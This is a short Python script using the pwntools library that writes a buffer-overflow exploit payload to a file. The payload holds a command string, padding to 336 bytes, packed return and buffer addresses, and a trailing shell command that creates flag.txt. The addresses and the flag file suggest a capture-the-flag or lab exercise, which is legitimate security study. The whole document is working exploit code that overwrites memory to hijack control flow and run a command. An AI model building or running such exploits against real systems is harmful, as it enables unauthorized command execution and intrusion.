from pwn import *

endereco_buffer = p64( 0x00005555555592a0)

endereco_remote = p64(0x55555555551a)

size_a = len(b"sendmail\0")

payload = b"sendmail\0"+b"a"*(336-size_a)+endereco_buffer+endereco_remote+b"\n"+b"touch flag.txt"

with open("payload.bin", "wb") as file:
    file.write(payload)